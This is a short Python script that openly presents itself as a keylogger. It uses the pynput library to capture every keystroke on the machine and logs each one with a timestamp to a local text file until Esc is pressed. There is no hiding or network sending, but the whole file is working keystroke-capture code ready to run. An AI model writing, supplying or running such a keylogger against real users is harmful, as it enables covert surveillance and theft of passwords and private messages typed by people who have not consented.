# Dependencies:
# install pynput
from pynput.keyboard import Key, Listener
import logging

output_dir = "" # leave blank to create the output file in current user dir, otherwise specify the path
output_name = "keylogger_output.txt"
logginginfo = logging.info
logging.basicConfig(filename=(output_dir + output_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logginginfo(str(key))
    print (key) #for testing purposes
    if key == Key.esc: # press esc to exit the keylogger/stop listener
        print ('exit')
        return False
        # pynput.keyboard.Listener.stop()
with Listener(on_press=on_press) as listener:
    listener.join()

